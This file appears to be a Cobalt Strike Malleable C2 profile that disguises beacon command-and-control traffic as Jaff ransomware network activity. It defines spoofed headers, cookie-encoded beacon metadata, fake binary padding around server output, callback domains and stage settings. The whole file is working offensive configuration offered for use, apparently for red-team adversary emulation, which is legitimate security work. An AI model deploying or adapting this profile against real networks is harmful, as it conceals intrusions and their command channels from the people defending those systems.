#jaff ransomware
#mostly taken from --> https://isc.sans.edu/forums/diary/Jaff+ransomware+gets+a+makeover/22446/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.2 (Windows NT 6.2; rv:50.2) Gecko/20200103 Firefox/50.2";
set dns_idle "8.8.8.8";
set maxdns    "235";

#initial
http-get {

    set uri "/af/fgJds2U";
    
    client {

	header "Accept" "*/*";
	header "Accept-Language" "en-US"; 
        header "Host" "minnessotaswordfishh.com";
	header "Accept-Encoding" "gzip, deflate";
        header "Connection" "Keep-Alive";
	
        
        metadata {
            netbios;
            header "Cookie";


        }


    }

    server {

        header "Server" "nginx";
	header "Etag" "15caf86-3b000-550323b001000";
	header "Connection" "Keep-Alive";
	header "Accept-Ranges" "bytes";
        

        output {
            netbios;

	    prepend ".l.q`Yo7sQIC..nA.cGlBQTu#Ptk93ZQI6cqcYo7wQIClmnA1cGlBQTucPtk.3ZQG)..c.f.V.H..L:)X.g.)>3..=T.X]4=...C+.YW8'c('=";

	    append ")*+......t...z.....&...4........*...H....{.....%8';+...1cGlBQTu3.tku2^Q~|G(cYo7w.JClBQTucPtk...";
            print;
        }
    }
}
#post infection
http-post {
    
    set uri "/a5/";
    set verb "GET";    

    client {
       
	header "Host" "maximusstafastoriesticks.info";
        
        output {
            base64url;
	    header "Cookie";

        }
             
        id {
            base64url;
	    append ".jaff";
	    uri-append;

        }
    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain; charset=utf-8";
	header "Connection" "keep-alive";
	header "Etag" "W/'7-rM9AyJuqT6iOan/xHh+AW+7K/T*'";
        

        output {
            netbios;
	    prepend "";
	    prepend "Created";
	    prepend "";
	    prepend "";
            print;
        }
    }
}

http-stager {


    server {
        header "Server" "nginx";
	header "Connection" "Keep-Alive";
	header "Accept-Ranges" "bytes";
    
    }


}

stage {
	#did not see a compile time so used the inspection date given
	set compile_time "23 May 2017 21:43:37";
	set userwx "false";
	#size in doc says '241664' c2lint wanted it bigger
	set image_size_x86 "281664";
}
